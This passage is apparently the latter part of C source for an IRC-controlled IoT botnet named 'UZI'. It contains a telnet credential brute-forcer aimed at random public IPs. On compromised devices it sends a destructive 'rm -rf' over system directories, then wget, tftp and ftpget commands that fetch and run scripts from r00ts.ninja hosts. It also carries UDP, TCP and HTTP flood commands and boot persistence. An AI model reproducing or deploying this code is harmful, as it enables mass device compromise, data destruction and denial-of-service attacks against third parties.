        return 0;
}
int contains_success(char* buffer) {
        return contains_string(buffer, successes);
}
int contains_fail(char* buffer) {
        return contains_string(buffer, fails);
}
int contains_response(char* buffer) {
        return contains_success(buffer) || contains_fail(buffer);
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size) {       
        fd_set read_set;
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = timeout_usec;
        FD_ZERO(&read_set);
        FD_SET(fd, &read_set);
        if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
        return 0;
        return recv(fd, buffer, buf_size, 0);
}
int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings) {
        int num_bytes, i;
        memset(buffer, 0, buf_size);
        num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);
        if(buffer[0] == 0xFF) {
                negotiate(fd, buffer, 3);
        }

        if(contains_string(buffer, strings)) {
                return 1;
        }

        return 0;
}
const char* get_telstate_host(struct telstate_t* telstate) { // get host
        struct in_addr in_addr_ip; 
        in_addr_ip.s_addr = telstate->ip;
        return inet_ntoa(in_addr_ip);
}
void advance_telstate(struct telstate_t* telstate, int new_state) { // advance
        if(new_state == 0) {
                close(telstate->fd);
        }
        telstate->tTimeout = 0;
        telstate->state = new_state;
        memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}
void reset_telstate(struct telstate_t* telstate) { // reset
        advance_telstate(telstate, 0);
        telstate->complete = 1;
}

void uzitelscan(int wait_usec, int maxfds, int sock) { 
        if(fork() == -1) return;
    
        int max = getdtablesize() - 100, i, res, num_tmps, j;
        
        char buf[128], cur_dir;
        if (max > maxfds)
                max = maxfds;
        fd_set fdset;
        struct timeval tv;
        socklen_t lon;
        int valopt;
        
        char line[256];
        char* buffer;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        
        buffer = malloc(SOCKBUF_SIZE + 1);
        memset(buffer, 0, SOCKBUF_SIZE + 1);
        
        struct telstate_t fds[max];
        
        memset(fds, 0, max * (sizeof(int) + 1));
        for(i = 0; i < max; i++)
        {
            memset(&(fds[i]), 0, sizeof(struct telstate_t));
            fds[i].complete = 1;
            fds[i].sockbuf = buffer;
        }
        while(1) {
                for(i = 0; i < max; i++) {
                        if(fds[i].tTimeout == 0) {
                                fds[i].tTimeout = time(NULL);
                        }
                        switch(fds[i].state) {
            case 0:
                {
                    if(fds[i].complete == 1)
                    {
                        char *tmp = fds[i].sockbuf;
                        memset(&(fds[i]), 0, sizeof(struct telstate_t));
                        fds[i].sockbuf = tmp;            
                        fds[i].ip = getRandomPublicIP();
                    }
                    else if(fds[i].complete == 0)
                    {
                        fds[i].usernameInd++;
                        fds[i].passwordInd++;
                                    
                        if(fds[i].passwordInd == sizeof(uzipasswords) / sizeof(char *))
                        {
                            fds[i].complete = 1;
                            continue;
                        }

                    }
                                
                    dest_addr.sin_family = AF_INET;
                    dest_addr.sin_port = htons(23);
                    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                    dest_addr.sin_addr.s_addr = fds[i].ip;
                                
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                                
                    if(fds[i].fd == -1) continue;
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
                    {
                        reset_telstate(&fds[i]);
                    }
                    else
                    {
                        advance_telstate(&fds[i], 1);
                    }
                }
                break;
                
            case 1:
                {
                    FD_ZERO(&fdset);
                    FD_SET(fds[i].fd, &fdset);
                    tv.tv_sec = 0;
                    tv.tv_usec = wait_usec;
                    res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
                    
                    if(res == 1) {
                        fds[i].tTimeout = 0;
                        lon = sizeof(int);
                        valopt = 0;
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                        if(valopt)
                        {
                            reset_telstate(&fds[i]);
                        }
                        else
                        {
                            fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
                            advance_telstate(&fds[i], 2);
                        }
                        continue;
                    }
                    else if(res == -1)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    if(fds[i].tTimeout + 7 < time(NULL))
                    {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
            case 2:
                {
                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
                    {
                        fds[i].tTimeout = time(NULL);
                        if(contains_fail(fds[i].sockbuf))
                        {
                            advance_telstate(&fds[i], 0);
                        }
                        else
                        {
							Send(sock, "PRIVMSG %s :13[UZI] [+] VULN DEVICE ---> [%s:23]\n", CHAN, get_telstate_host(&fds[i]));
                            advance_telstate(&fds[i], 3);
                        }
                        continue;
                    }
                    if(fds[i].tTimeout + 7 < time(NULL))
                    {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
            case 3:
                {
                    if(send(fds[i].fd, uziusernames[fds[i].usernameInd], strlen(uziusernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
					Send(sock, "PRIVMSG %s :13[UZI] [+] USERNAME SENT ---> [%s:%s:23]\n", CHAN, get_telstate_host(&fds[i]), uziusernames[fds[i].usernameInd]);
                    advance_telstate(&fds[i], 4);
                }
                break;
            case 4:
                {
                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
                    {
                        fds[i].tTimeout = time(NULL);
                        if(contains_fail(fds[i].sockbuf))
                        {
                            advance_telstate(&fds[i], 0);
                        }
                        else
                        {
							Send(sock, "PRIVMSG %s :13[UZI] [+] PASSWORD ATTEMPT ---> [%s:23]\n", CHAN, get_telstate_host(&fds[i]));
                            advance_telstate(&fds[i], 5);
                        }
                        continue;
                    }
                    if(fds[i].tTimeout + 7 < time(NULL))
                    {
                        reset_telstate(&fds[i]);
                    }
                }
                break;                                
            case 5:
                {
                    if(send(fds[i].fd, uzipasswords[fds[i].passwordInd], strlen(uzipasswords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
                    {
                        reset_telstate(&fds[i]);
                        continue;
                    }
					Send(sock, "PRIVMSG %s :13[UZI] [+] PASSWORD SENT ---> [%s:%s:%s:23]\n", CHAN, get_telstate_host(&fds[i]),uziusernames[fds[i].usernameInd],  uzipasswords[fds[i].passwordInd]);
                    advance_telstate(&fds[i], 6);
                }
                break;                                    
            case 6:
                {
                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2)) 
                    {
                        fds[i].tTimeout = time(NULL);
                        
                        if(contains_fail(fds[i].sockbuf))
                        {
                            advance_telstate(&fds[i], 0);
                        }
                        else if(contains_success(fds[i].sockbuf))
                        {
                            if(fds[i].complete == 2)
                            {
                                Send(sock, "PRIVMSG %s :13[UZI] [+] INFECT ATTEMPT DETECTED ---> [%s:%s:%s:23]\n", CHAN, get_telstate_host(&fds[i]), uziusernames[fds[i].usernameInd], uzipasswords[fds[i].passwordInd]);
                                advance_telstate(&fds[i], 7);
                            }
                        }
                        else
                        {
                            reset_telstate(&fds[i]);
                        }
                        continue;
                    }
                    if(fds[i].tTimeout + 30 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
			case 7:
                {
                    if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                    advance_telstate(&fds[i], 8);
                }
				case 8:
                {
                    fds[i].tTimeout = 0;
                    if(send(fds[i].fd, "rm -rf /tmp/* /var/* /dev/* /var/run/* /var/tmp/* /dev/shm/* /mnt/* /boot/* /usr/*\r\n", 84, MSG_NOSIGNAL) < 0) {
                        Send(sock, "PRIVMSG %s :13[UZI] [+] DIRECTORIES CLEARED ---> [%s:%s:%s:23]\n", CHAN, inet_ntoa(*(struct in_addr *)&(fds[i].ip)), uziusernames[fds[i].usernameInd], uzipasswords[fds[i].passwordInd]);
                        advance_telstate(&fds[i], 9);
                        continue;
                    }
				}
            case 9:
                {
                    fds[i].tTimeout = time(NULL);
                    if(send(fds[i].fd, "/bin/busybox wget lol.r00ts.ninja/w.sh || wget lol.r00ts.ninja/w.sh && sh w.sh\r\n", 80, MSG_NOSIGNAL) < 0) {
						Send(sock, "PRIVMSG %s :13[UZI] [-] WGET PAYLOAD SENT ---> [%s:%s:%s:23]\n", CHAN, inet_ntoa(*(struct in_addr *)&(fds[i].ip)), uziusernames[fds[i].usernameInd], uzipasswords[fds[i].passwordInd]);
                        reset_telstate(&fds[i]);
                        continue;
                    }
					if(fds[i].tTimeout + 45 < time(NULL))  {
						send(fds[i].fd, "/bin/busybox tftp tftp.r00ts.ninja -c get u.sh && /bin/busybox tftp -r u.sh -g tftp.r00ts.ninja || tftp tftp.r00ts.ninja -c get u.sh && tftp -r u.sh -g tftp.r00ts.ninja && sh u.sh && bash u.sh\r\n", 194, MSG_NOSIGNAL);
						Send(sock, "PRIVMSG %s :13[UZI] [-] TFTP PAYLOAD SENT ---> [%s:%s:%s:23]\n", CHAN, inet_ntoa(*(struct in_addr *)&(fds[i].ip)), uziusernames[fds[i].usernameInd], uzipasswords[fds[i].passwordInd]);
                        reset_telstate(&fds[i]);
					}
					if(fds[i].tTimeout + 45 < time(NULL))  {
						send(fds[i].fd, "ftpget -v -u anonymous -p anonymous -P 21 21ftp.r00ts.ninja f1.sh && sh ftp1.sh\r\n", 81, MSG_NOSIGNAL);
						Send(sock, "PRIVMSG %s :13[UZI] [-] FTPGET PAYLOAD SENT ---> [%s:%s:%s:23]\n", CHAN, inet_ntoa(*(struct in_addr *)&(fds[i].ip)), uziusernames[fds[i].usernameInd], uzipasswords[fds[i].passwordInd]);
                        reset_telstate(&fds[i]);
					}
						else {
                        Send(sock, "PRIVMSG %s :13[UZI] [+] PAYLOAD SENT ---> [%s:%s:%s:23]\n", CHAN, inet_ntoa(*(struct in_addr *)&(fds[i].ip)), uziusernames[fds[i].usernameInd], uzipasswords[fds[i].passwordInd]);
                        if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, infectconfirm)) {
                            Send(sock, "PRIVMSG %s :13[UZI] [+] SUCCESSFUL INFECTION ---> [%s:%s:%s:23]\n", CHAN, inet_ntoa(*(struct in_addr *)&(fds[i].ip)), uziusernames[fds[i].usernameInd], uzipasswords[fds[i].passwordInd]);
                            reset_telstate(&fds[i]);
                            continue;
                        }
                    }
                        
                    if(fds[i].tTimeout + 60 < time(NULL)) {
                        if(fds[i].complete!=3) {
                            Send(sock, "PRIVMSG %s :13[UZI] [-] FAILED TO INFECT ---> [%s:%s:%s:23]\n", CHAN, get_telstate_host(&fds[i]), uziusernames[fds[i].usernameInd], uzipasswords[fds[i].passwordInd]);
                        }
                        reset_telstate(&fds[i]);
                    }
                    break;
                }
				
            }
        }
    }
}

void uzitelscanargs(int sock) {
        uint32_t parent;
        parent = fork();
        int forks = sysconf(_SC_NPROCESSORS_ONLN);
        int fds = forks * 512; //Far effective. 100 sockets for each CPU. - ZoneHax
        if(parent > 0) {
            scanPid = parent;
            return;
        }
        else if(parent == -1) return;
        int ii;
        for(ii = 0; ii < forks; ii++) {
            srand((time(NULL) ^ getpid()) + getppid());
            init_rand(time(NULL) ^ getpid());
            uzitelscan(5000, fds, sock);
         }
         return;
}

void uziscanstart(int sock, char *sender, int argc, char **argv) {
    if(argc < 1) {
        Send(sock, "NOTICE %s :UZIBRUTE <ON/OFF>\n", sender);
        return;
    }
    if(!strcmp(argv[1], "ON")) {
        if(scanPid == 0) {
            uzitelscanargs(sock);
            if(scanPid != 0) {
                Send(sock, "PRIVMSG %s :4[UZI] 6[+] UZIBRUTE STARTED!\n", chan); //Scanner has been started successfully!!!
                return;
            } else {
                Send(sock, "PRIVMSG %s :4[UZI] 6[-] FAILED TO START UZIBRUTE!\n", chan);
                return;
            }
        } else {
            Send(sock, "PRIVMSG %s :4[UZI] 6[+] UZIBRUTE ALREADY STARTED!\n", chan);
            return;
        }
    }
    if(!strcmp(argv[1], "OFF")) {
        if(scanPid != 0) {
            if(kill(scanPid, 9) == 0) {
                Send(sock, "PRIVMSG %s :4 6[UZI] [+] UZIBRUTE KILLED!\n", chan);
                scanPid = 0;
                return;
            } else {
                Send(sock, "PRIVMSG %s :4[UZI] 6[-] FAILED TO KILL UZIBRUTE!\n", chan);
                return;
            }
        } else {
            Send(sock, "PRIVMSG %s :4[UZI] 6[+] UZIBRUTE NOT STARTED!\n", chan);
            return;
        }
    } else {
        Send(sock, "NOTICE %s :4[UZI] 11[+] UZIBRUTE <ON/OFF>\n", sender);
        return;
    }
}

struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
	{ "QUDP", udpbiatch },
	{ "QTCP", sendTCP},
	{ "STD", regstd},
	{ "TSTD", threadstd},
	{ "QHOLD", hold },
    { "QJUNK", junk },
	{ "RUDP", rawUDP },
	{ "UZIBRUTE", uziscanstart },
	{ "NICK", nickc },
	{ "UZIMUSTDIE", killd },
	{ "HTTPFLOOD", HTTP },
	{ "KILLALL", killall },
	{ "HELP", help },
	{ "PACKETSIZECHANGE", train_ps },
	{ "MAXBOOTCHANGE", max_bt },
	{ "MAXATTACKTHREADS", max_threads },
	{ (char *)0, (void (*)(int,char *,int,char **))0 } };

void _PRIVMSG(int sock, char *sender, char *str) {
        int i;
        char *to, *message;
        for (i=0;i<strlen(str) && str[i] != ' ';i++);
        str[i]=0;
        to=str;
        message=str+i+2;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
        if (*message == '!' && !strcasecmp(to,chan)) {
                char *params[12], name[1024]={0};
                int num_params=0, m;
                message++;
                for (i=0;i<strlen(message) && message[i] != ' ';i++);
                message[i]=0;
                if (strwildmatch(message,nick)) return;
                message+=i+1;
                if (!strncmp(message,"IRC ",4)) if (disabled) Send(sock, "NOTICE %s :Unable to comply.\n", sender); else Send(sock, "%s\n",message+4);
                m=strlen(message);
                for (i=0;i<m;i++) {
                        if (*message == ' ' || *message == 0) break;
                        name[i]=*message;
                        message++;
                }
                for (i=0;i<strlen(message);i++) if (message[i] == ' ') num_params++;
                num_params++;
                if (num_params > 10) num_params=10;
                params[0]=name;
                params[num_params+1]="\0";
                m=1;
                while (*message != 0) {
                        message++;
                        if (m >= num_params) break;
                        for (i=0;i<strlen(message) && message[i] != ' ';i++);
                        params[m]=(char*)malloc(i+1);
                        strncpy(params[m],message,i);
                        params[m][i]=0;
                        m++;
                        message+=i;
                }
                for (m=0; flooders[m].cmd != (char *)0; m++) {
                        if (!strcasecmp(flooders[m].cmd,name)) {
                                flooders[m].func(sock,sender,num_params-1,params);
                                for (i=1;i<num_params;i++) free(params[i]);
                                return;
                        }
                }
        }
}
void _376(int sock, char *sender, char *str) {
        Send(sock,"MODE %s -xi\n",nick);
        Send(sock,"JOIN %s :%s\n",chan,key);
        Send(sock,"WHO %s\n",nick);
}
void _PING(int sock, char *sender, char *str) {
        Send(sock,"PONG %s\n",str);
}
void _352(int sock, char *sender, char *str) {
        int i,d;
        char *msg=str;
        struct hostent *hostm;
        unsigned long m;
        for (i=0,d=0;d<5;d++) {
                for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                if (i == strlen(str)) return;
        }
        for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
        msg[i]=0;
        if (!strcasecmp(msg,nick) && !spoofsm) {
                msg=str;
                for (i=0,d=0;d<3;d++) {
                        for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                        if (i == strlen(str)) return;
                }
                for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
                msg[i]=0;
                if ((m = inet_addr(msg)) == -1) {
                        if ((hostm=gethostbyname(msg)) == NULL) {
                               
                                return;
                        }
                        memcpy((char*)&m, hostm->h_addr, hostm->h_length);
                }
                ((char*)&spoofs)[3]=((char*)&m)[0];
                ((char*)&spoofs)[2]=((char*)&m)[1];
                ((char*)&spoofs)[1]=((char*)&m)[2];
                ((char*)&spoofs)[0]=0;
                spoofsm=256;
        }
}
void _433(int sock, char *sender, char *str) {
        free(nick);
        nick=makestring();
}
void _NICK(int sock, char *sender, char *str) {
	int i;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
	if (!strcasecmp(sender,nick)) {
		if (*str == ':') str++;
		if (nick) free(nick);
		nick=strdup(str);
	}
}
struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
        { "352", _352 },
        { "376", _376 },
        { "433", _433 },
        { "422", _376 },
        { "PRIVMSG", _PRIVMSG },
        { "PING", _PING },
	{ "NICK", _NICK },
{ (char *)0, (void (*)(int,char *,char *))0 } };
void con() {
        struct sockaddr_in srv;
        unsigned long ipaddr,start;
        int flag;
        struct hostent *hp;
start:
	sock=-1;
	flag=1;
	if (changeservers == 0) server=servers[rand()%numservers];
	changeservers=0;
        while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
	if (inet_addr(server) == 0 || inet_addr(server) == -1) {
		if ((hp = gethostbyname(server)) == NULL) {
			server=NULL;
			close(sock);
			goto start;
		}
		bcopy((char*)hp->h_addr, (char*)&srv.sin_addr, hp->h_length);
	}
	else srv.sin_addr.s_addr=inet_addr(server);
        srv.sin_family = AF_INET;
        srv.sin_port = htons(cnport); 
	ioctl(sock,FIONBIO,&flag);
	start=time(NULL);
	while(time(NULL)-start < 10) {
		errno=0;
		if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0 || errno == EISCONN) {
		        setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
			return;
		}
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
		sleep(1);
	}
	server=NULL;
	close(sock);
	goto start;
}
int main(int argc, char **argv) {
		printf("UZI\n");
        int on,i;
        char cwd[256],*str;
        FILE *file;
#ifdef STARTUP
	str="/etc/rc.d/rc.local";
	file=fopen(str,"r");
	if (file == NULL) {
		str="/etc/rc.conf";
		file=fopen(str,"r");
	}
        if (file != NULL) {
                char outfile[256], buf[1024];
                int i=strlen(argv[0]), d=0;
                getcwd(cwd,256);
                if (strcmp(cwd,"/")) {
                        while(argv[0][i] != '/') i--;
                        sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
                        while(!feof(file)) {
                                fgets(buf,1024,file);
                                if (!strcasecmp(buf,outfile)) d++;
                        }
                        if (d == 0) {
                                FILE *out;
                                fclose(file);
                                out=fopen(str,"a");
                                if (out != NULL) {
                                        fputs(outfile,out);
                                        fclose(out);
                                }
                        }
                        else fclose(file);
                }
                else fclose(file);
        }
#endif
        if (fork()) exit(0);
        getOurIP();
#ifdef FAKENAME
	strncpy(argv[0],FAKENAME,strlen(argv[0]));
        for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
#endif
        srand((time(NULL) ^ getpid()) + getppid());
        nick=makestring();
        ident=BOTident;
        user=BOTuser;
        chan=CHAN;
	key=KEY;
	server=NULL;
sa:
#ifdef IDENT
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        kill(pids[i],9);
			waitpid(pids[i],NULL,WNOHANG);
                }
        }
	pids=NULL;
	numpids=0;
	identd();
#endif
	con();
        Send(sock, "NICK [%s|%s]%s\nUSER %s localhost localhost :%s\n", PREFIX, getBuild(), nick, user, ident);
        while(1) {
                unsigned long i;
                fd_set n;
                struct timeval tv;
                FD_ZERO(&n);
                FD_SET(sock,&n);
                tv.tv_sec=60*20;
                tv.tv_usec=0;
                if (select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) goto sa;
                for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
                        unsigned int *newpids,on;
                        for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
			pids[on-1]=0;
                        numpids--;
                        newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
                        for (on=0;on<numpids;on++) newpids[on]=pids[on];
                        free(pids);
                        pids=newpids;
                }
                if (FD_ISSET(sock,&n)) {
                        char buf[4096], *str;
                        int i;
                        if ((i=recv(sock,buf,4096,0)) <= 0) goto sa;
                        buf[i]=0;
                        str=strtok(buf,"\n");
                        while(str && *str) {
                                char name[1024], sender[1024];
                                filter(str);
                                if (*str == ':') {
                                        for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                        str[i]=0;
                                        strcpy(sender,str+1);
                                        strcpy(str,str+i+1);
                                }
                                else strcpy(sender,"*");
                                for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                str[i]=0;
                                strcpy(name,str);
                                strcpy(str,str+i+1);
                                for (i=0;msgs[i].cmd != (char *)0;i++) if (!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock,sender,str);
                                if (!strcasecmp(name,"ERROR")) goto sa;
                                str=strtok((char*)NULL,"\n");
                        }
                }
        }
        return 0;
}